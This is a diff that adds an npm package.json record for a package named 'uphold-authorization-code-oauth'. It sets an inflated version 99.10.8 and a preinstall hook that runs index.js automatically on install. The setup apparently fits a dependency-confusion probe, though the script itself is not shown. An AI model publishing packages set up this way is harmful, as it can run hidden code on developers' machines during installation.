@@ -1,0 +1,39 @@
+{
+    "name": "uphold-authorization-code-oauth",
+    "version": "99.10.8",
+    "description": "uphold test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "uphold-authorization-code-oauth@99.10.8",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-iGRa/YKZBcnSUl4ArAuVr1AobY5GJhQ8mwcDZ3858JmakSeSjM+Vmc+ZbKaREGvAGwLKFeQpVdirNiruk7N0dg==",
+        "shasum": "5f61c09cfab67c963e8be8f3c8252f11071f3f0d",
+        "tarball": "https://registry.npmjs.org/uphold-authorization-code-oauth/-/uphold-authorization-code-oauth-99.10.8.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3238,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmnmLCRA9TVsSAnZWagAAyfkQAJJG6H9juHXerlm0/h8G\nCDmlNkJcA0rXKiufJH7YE75uEvPFw/m0wceufc9KXDMFmgv5CCzv4shvc1S3\nWrsiTWA6BC/sRtrELl7b1WNXPdT7UFE0wno75FE3v/Sj8doGSrpgZ1eIQoNX\nzZG19odV7MHfJxS0KyrgH6DBF1X7pMaMC1hJzb/r6/zICbUGCL94/7TeEqFl\n2N4cyByYHruBYWrh41/+2er6dnhg8WsH41WvDiTg7aJP8tcYPvnZo5Fj1KTH\nvo8b0DAQxrAAcPXOFcDMqhYzmI8Jyh3G0DNq6M3gH/Fvyh/N54qoDCkeY14k\nRiwgzU7ZHtwtCnhb013IsydTb4tenDLO5pQ8kB5LnrawcgFnh7caF+BYkZOL\nTGWAsQp2tPErdgDchQkCxcJiqsNVO1SgS702c0Uxc+lv6pN9jXTiw5U6mAp4\nSZ2jIgxO1ibWKXxzKBQVawWaDinwJ0f1ZfPiWZqOPIX65uvwOVtiJO3gHm5z\nAHD6BQtUcNAAPKVqJdpvc+xw6d96QgQi8ClYhnE6Lqv8OBVI2SNprNaEu0v9\nIp68NT/W96An28/Zl1BJwGutvXKCJnm5NuVZLCLRSPV18wIbfveCXvV9Bcrd\naKwLCeIOmlqHgOeRJelyh0OslEpE8fYmFBF4i0TicbsTOmLwDvv5VbwEARBx\nc/HN\r\n=EXRJ\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/uphold-authorization-code-oauth_99.10.8_1637513610907_0.9571074419113659"
+    },
+    "_hasShrinkwrap": false
+}
